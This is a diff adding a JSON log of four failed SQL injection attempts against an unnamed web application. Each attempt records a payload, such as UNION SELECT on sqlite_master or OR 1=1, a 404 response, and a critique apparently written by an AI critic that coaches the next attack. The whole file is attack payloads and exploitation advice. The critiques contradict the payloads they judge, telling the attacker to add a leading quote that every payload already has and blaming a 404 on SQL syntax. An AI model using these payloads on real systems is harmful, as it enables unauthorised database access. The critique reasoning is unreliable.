@@ -1,0 +1,34 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": "' UNION SELECT * FROM sqlite_master --",
+        "server_response_summary": "Status 404",
+        "gamma_critique": "You are trapped inside a string. The payload ' UNION SELECT * FROM sqlite_master -- failed to breach the SQLi vulnerability because it did not break out of the query structure, resulting in a 404 Not Found error due to an unrecognized URL.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": "' UNION ALL SELECT * FROM sqlite_master --",
+        "server_response_summary": "Status 404",
+        "gamma_critique": "The provided payload failed to breach the SQLi vulnerability because it did not break out of the string literal in the 'username' field, resulting in a syntax error that the application interpreted as a 404 Not Found error. You are trapped inside a string. Start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 3,
+        "vuln_type": "sqli",
+        "payload": "' AND 1=1 --",
+        "server_response_summary": "Status 404",
+        "gamma_critique": "You are trapped inside a string. Start your next payload with a leading quote (e.g., ' ) to break out of the query structure.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 4,
+        "vuln_type": "sqli",
+        "payload": "' OR 1=1 --",
+        "server_response_summary": "Status 404",
+        "gamma_critique": "You are trapped inside a string. The payload ' OR 1=1 -- failed to breach the SQLi vulnerability because the '--' comment syntax is likely being interpreted as a string literal within the SQL query, rather than a comment, resulting in a syntax error.",
+        "outcome": "failed"
+    }
+]
